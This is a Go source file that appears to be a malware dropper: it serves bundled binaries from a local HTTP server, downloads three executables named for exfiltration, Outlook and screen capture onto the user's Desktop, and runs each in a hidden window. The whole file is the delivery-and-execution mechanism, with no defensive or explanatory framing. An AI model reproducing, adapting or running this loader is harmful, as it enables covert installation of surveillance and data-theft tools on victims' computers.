package main

import (
	"net/http"
	"github.com/gobuffalo/packr"
	"io"
    "os/exec"
    "fmt"
    "os"
    "syscall"
    "os/user"
    "log"
)

func main() {
	go HostFiles()
	exfilurl := "http://127.0.0.1:3001/e.exe"
    outlookurl := "http://127.0.0.1:3001/o.exe"
    screenurl := "http://127.0.0.1:3001/s.exe"
    usr, err := user.Current()
    if err != nil {
        log.Println( err )
    }
    fmt.Println( usr.HomeDir )
    exfloc := usr.HomeDir + "\\Desktop\\e.exe"
    outloc := usr.HomeDir + "\\Desktop\\o.exe"
    screenloc := usr.HomeDir + "\\Desktop\\s.exe"

    DownloadFile(exfloc, exfilurl)
    DownloadFile(outloc, outlookurl)
    DownloadFile(screenloc, screenurl)

    c := exec.Command("cmd" ,"/C",screenloc)
    c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    if err := c.Start(); err != nil { 
       log.Println( err )
    } 

    a := exec.Command("cmd","/C",exfloc)
    a.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    if err := a.Start(); err != nil { 
        log.Println( err )
    }   

    b := exec.Command("cmd", "/C" ,outloc)
    b.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    if err := b.Start(); err != nil { 
         log.Println( err )
    }   
  
}

func HostFiles(){
	box := packr.NewBox("./bin")
	http.Handle("/", http.FileServer(box))
	http.ListenAndServe(":3001", nil)
}

func DownloadFile(filepath string, url string) error {
    out, err := os.Create(filepath)
    if err != nil {
        return err
    }
    defer out.Close()
    resp, err := http.Get(url)
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    _, err = io.Copy(out, resp.Body)
    if err != nil {
        return err
    }
    println("Downloaded file")
    return nil
}